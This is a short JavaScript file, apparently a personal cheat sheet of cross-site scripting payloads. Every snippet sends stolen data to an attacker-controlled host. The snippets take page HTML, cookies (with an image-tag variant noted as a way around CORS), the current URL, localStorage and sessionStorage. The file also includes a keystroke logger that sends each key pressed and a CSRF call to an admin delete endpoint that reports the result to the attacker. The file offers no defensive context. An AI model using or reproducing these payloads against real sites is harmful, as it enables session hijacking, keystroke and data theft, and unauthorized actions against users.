// attacker ip
const attacker = '';

// steal html v1
fetch(`${attacker}/?html=${btoa(window.document.body.innerHTML)}`);

// steal html v2
fetch(`${attacker}/?html=${btoa(document.documentElement.outerHTML)}`);

// steal cookies v1 
if (document.cookie) {
  fetch(`${attacker}/?cookies=${encodeURIComponent(document.cookie)}`);
}

// to avoid possible cors issues, try this:
// steal cookies v2
const i = document.createElement('img');
i.src = `${attacker}/?img-cookies=${encodeURIComponent(document.cookie)}`;
document.body.appendChild(i);

// steal current page URL
fetch(`${attacker}/?url=${encodeURIComponent(location.href)}`);

// steal localStorage
fetch(`${attacker}/?localstorage=${encodeURIComponent(JSON.stringify(localStorage))}`);

// steal sessionStorage
fetch(`${attacker}/?sessionstorage=${encodeURIComponent(JSON.stringify(sessionStorage))}`);

// poor mans keylogger (just logs single keystrokes in real time)
document.addEventListener('keypress', e => {
  fetch(`${attacker}/?char=${e.key}`);
});

// try triggering a sensitive endpoint (example: CSRF)
fetch('/admin/delete?user=testko')
  .then(() => fetch(`${attacker}/csrf?result=success`))
  .catch(() => fetch(`${attacker}/csrf?result=fail`));
